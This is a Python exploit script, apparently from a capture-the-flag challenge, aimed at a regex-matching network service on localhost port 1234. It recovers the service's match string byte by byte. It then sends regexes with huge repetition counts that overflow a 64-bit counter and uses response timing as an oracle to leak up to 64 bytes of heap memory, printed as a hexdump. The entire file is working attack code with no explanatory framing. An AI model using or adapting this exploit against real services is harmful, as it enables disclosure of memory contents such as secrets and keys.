import time
import functools 
import socket
import string


def generate_numbers(target):
    path = []  
    max_ = 90000
    cval = 1
    nval = 1
    x = max_
    while True:
        nval = x * cval
        if nval < target:
            path.append(x)
            cval = nval
            max_ = 90000
            continue
        x -= 1
        if x == 1:
            break
    return target - cval, path

def generate_pattern(path):
    if not len(path):
        return ''
    p = '.'
    for mult in path:
        p += '{' + str(mult) + '}'
    return p


def create_regex(paths):
    r = ''
    for path in paths:
        r += generate_pattern(path)
    return r


def sense_check(paths, target):
    sum_ = 0
    for path in paths:
        if not len(path):
            break
        mult = functools.reduce(lambda x, y: x * y, path)
        sum_ += mult
    assert sum_ == target - 1


def generate_suffix(code, suffix):
    """Generates a bytes start - end"""
    return f'\\x{code:02x}{suffix}'


def generate_regex(target, prefix, suffix):
    paths = []
    ntarget = target
    for _ in range(10):
        ntarget, path = generate_numbers(ntarget)
        paths.append(path)
        if ntarget == 0:
            break

    sense_check(paths, target)
    return prefix + create_regex(paths) + suffix + '\n'

PREFIX = '((.+)*.([eFw]).)?'

sock = socket.socket(socket.AF_INET6, socket.SOCK_STREAM)
sock.connect(('::1', 1234))


def send_packet(input_):
    # print(f'[>] Sending input: {input_}')
    t0 = time.time()
    sock.sendall(input_.encode('ascii'))
    line = sock.recv(0x10)
    t1 = time.time()
    elapsed = t1 - t0
    # print(f'[/] elapsed time: {t1 - t0}')
    return elapsed, line


print('[+] Extract the target text to match')


def detect_match_string():
    input_ = ''
    while True:
        n = 1
        for i in range(256):
            ninput_ = input_ + f'\\x{i:02x}'
            _, line =  send_packet('^' + ninput_ + '\n')

            is_match = b'nomatch' not in line
            if is_match:
                input_ = ninput_
                break

        if not is_match:
            print(f'[+] Final string = {input_}')
            break

        n += 1

    return input_, n


to_print = string.ascii_letters + string.punctuation + string.digits
suffix, suffix_length = detect_match_string()


def dump(seq):
    x = ' '.join(f'{i:02x}' for i in seq)
    y = ''.join(f'{chr(b)}' if chr(b) in to_print else '.' for b in seq)
    return f'{x}  {y}'


def hexdump(seq):
    for s in range(0, len(seq), 8):
        print(dump(seq[s:s+8]))


bytes_ = []

for offset in range(0x40):
    suffix_length += 1
    for i in range(256):
        nsuffix = generate_suffix(i, suffix)
        input_ = generate_regex(((2 ** 64) - suffix_length + 2), PREFIX, nsuffix)
        elapsed, _ = send_packet(input_)        
        
        is_match = elapsed > 1

        if elapsed > 1:
            c = chr(i) if chr(i) in to_print else '.'
            print(f'[+] Found byte for position {offset}: byte=0x{i:02x}, printable={c}, elapsed={elapsed}')
            suffix = nsuffix
            bytes_.append(i)
            break

    if (offset + 1) % 8 == 0:
        print('===== Bytes Seen So Far =====')
        hexdump(bytes_)

    if not is_match:
        print(f'[-] Finished due to no match found, heap contents probably changed')
        break

print('====== HEXDUMP ======')
bytes_.reverse()
hexdump(bytes_)
